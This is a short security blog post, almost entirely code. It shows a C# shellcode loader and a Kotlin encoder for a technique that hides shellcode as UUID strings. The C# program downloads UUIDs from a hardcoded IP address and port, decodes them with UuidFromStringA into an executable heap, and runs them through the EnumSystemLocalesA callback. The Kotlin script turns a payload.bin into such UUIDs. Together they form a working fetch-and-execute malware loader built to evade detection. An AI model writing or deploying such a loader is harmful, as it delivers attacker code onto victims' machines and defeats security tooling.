---
author: XhstormR
tags:
- security
date: 2021-03-14T14:40:49+08:00
title: Load shellcode from UUID
---

<!--more-->

Updated on 2021-03-14

>

### uuid.cs

```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:winexe uuid.cs
```

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

class Program {
  [DllImport("rpcrt4")]
  private static extern int UuidFromStringA(string uuid, IntPtr hpAddress);

  [DllImport("kernel32")]
  private static extern IntPtr HeapCreate(int flOptions, int dwInitialSize, int dwMaximumSize);

  [DllImport("kernel32")]
  private static extern IntPtr HeapAlloc(IntPtr hHeap, int dwFlags, int dwBytes);

  [DllImport("kernel32")]
  private static extern IntPtr EnumSystemLocalesA(IntPtr hAddress, int dwflags);

  private static void Main(string[] args) {
    WebRequest httpWebRequest = WebRequest.Create("http://47.98.135.65:9527/uuid.txt");
    httpWebRequest.Method = "GET";
    WebResponse response = httpWebRequest.GetResponse();
    Stream responseStream = response.GetResponseStream();
    StreamReader streamReader = new StreamReader(responseStream, Encoding.Default);
    List<string> ids = new List<string>();
    for (;;) {
      string text = streamReader.ReadLine();
      if (text == null) break;
      ids.Add(text);
    }
    IntPtr hHeap = Program.HeapCreate(Program.HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    IntPtr intPtr = Program.HeapAlloc(hHeap, 0, 0x100000);
    IntPtr intPtr2 = intPtr;
    string[] array = ids.ToArray();
    for (int i = 0; i < array.Length; i++) {
      int num2 = Program.UuidFromStringA(array[i], intPtr2);
      intPtr2 = (IntPtr)((int)intPtr2 + 16);
    }
    Program.EnumSystemLocalesA(intPtr, 0);
  }

  private static int HEAP_CREATE_ENABLE_EXECUTE = 262144;
}
```


### uuid.kts

```bash
D:\Work\kotlinc\bin\kotlinc -script uuid.kts
```

```kotlin
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.*

fun main() {
    val file = File("payload.bin")
    if (!file.exists()) return

    file.readBytes()
        .asList()
        .chunked(16)
        .map { it.toMutableList().apply { repeat(16 - this.size) { this += 0 } } }
        .map { it.toByteArray() }
        .map { toUUID(it) }
        .forEach { println(it) }
}

// https://stackoverflow.com/questions/5745512/how-to-read-a-net-guid-into-a-java-uuid
fun toUUID(bytes: ByteArray): UUID {
    val source = ByteBuffer.wrap(bytes)
    val target = ByteBuffer.allocate(16)
        .order(ByteOrder.LITTLE_ENDIAN)
        .putInt(source.int)
        .putShort(source.short)
        .putShort(source.short)
        .order(ByteOrder.BIG_ENDIAN)
        .putLong(source.long)
    target.rewind()
    return UUID(target.long, target.long)
}

main()
```
